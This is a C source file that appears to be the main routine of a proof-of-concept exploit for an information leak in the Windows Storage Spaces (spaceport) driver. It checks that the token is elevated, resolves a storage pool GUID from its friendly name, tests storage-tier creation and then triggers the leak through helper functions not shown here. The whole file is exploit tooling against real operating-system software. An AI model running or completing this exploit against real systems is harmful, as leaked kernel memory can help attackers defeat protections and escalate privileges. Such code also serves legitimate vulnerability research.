#include <Windows.h>
#include <sddl.h>
#include <stdint.h>
#include <stdio.h>


#include "spaceport.h"

/* get the elevation type of the process token, to check further if we are
 * running as administrators*/
uint32_t GetProcessTokenElevationType(PTOKEN_ELEVATION_TYPE type) {
  HANDLE hAccessToken = NULL;
  uint32_t ret = EXIT_SUCCESS;
  TOKEN_ELEVATION_TYPE tokenElevationType;
  DWORD size;

  if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hAccessToken)) {
    uint32_t res = GetLastError();
    if (res != ERROR_NO_TOKEN) {
      printf("[-] ERROR : encountered a fatal error while trying to get "
             "current thread token : %i\n",
             res);
      goto FAILURE;
    }
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hAccessToken)) {
      printf("[-] ERROR : encountered a fatal error while trying to get "
             "current process token : %i\n",
             res);
      goto FAILURE;
    }
  }

  if (!GetTokenInformation(hAccessToken, TokenElevationType,
                           &tokenElevationType, sizeof(TOKEN_ELEVATION_TYPE),
                           &size)) {
    printf("failed getting the current elevation type : %i\n", GetLastError());
    goto FAILURE;
  }

  *type = tokenElevationType;

END:
  if (hAccessToken)
    CloseHandle(hAccessToken);
  return ret;

FAILURE:
  ret = EXIT_FAILURE;
  goto END;
}

uint32_t CheckProcessElevated(bool *out) {
  TOKEN_ELEVATION_TYPE type;
  *out = false;
  if (EXIT_SUCCESS != GetProcessTokenElevationType(&type)) {
    return EXIT_FAILURE;
  }

  if (type == TokenElevationTypeFull)
    *out = true;

  return EXIT_SUCCESS;
}

bool IsCurrentProcessElevated() {
  bool ret = false;
  if (EXIT_SUCCESS != CheckProcessElevated(&ret))
    return false;

  return ret;
}

int main(int argc, char *argv[]) {

  GUID poolGUID;

  /* first ensures we have a pool firendly name and it's valid. Use that to get
   * the GUID associated with the pool*/
  if (argc != 2) {
    printf("Usage: ./spaceport_leak.exe <pool friendly name>");
    return EXIT_FAILURE;
  }

  if (EXIT_FAILURE == GetAssociatedPoolA(argv[1], &poolGUID)) {
    printf(
        "cannot get a pool given the friendly named passed on command line\n");
    return EXIT_FAILURE;
  }

  /* now we need to run several checks to ensure it's possible to get the leak*/

  /* check 1 : check if running as elevated, because otherwise we'll fail at the
   * SpAccessCheck function*/
  if (!IsCurrentProcessElevated()) {
    printf("cannot run the leak because you're not running as elevated\n");
    return EXIT_FAILURE;
  }

  /* check 2 : check if it's possible to create a storage tier with the given
     pool name (the way we do it here) the other way we should check if it's
     possible to set a storage info (left as an exercise for the reader :O)
  */
  if (EXIT_SUCCESS != CheckCreateTier(poolGUID)) {
    printf("won't be able to get leak because testing tier creation and "
           "deletion failed\n");
    return EXIT_FAILURE;
  }

  /* now we are all set, get the leak*/
  if (EXIT_SUCCESS != GetLeak(poolGUID)) {
    printf("failure on leak\n");
    return EXIT_FAILURE;
  }

  return EXIT_SUCCESS;
}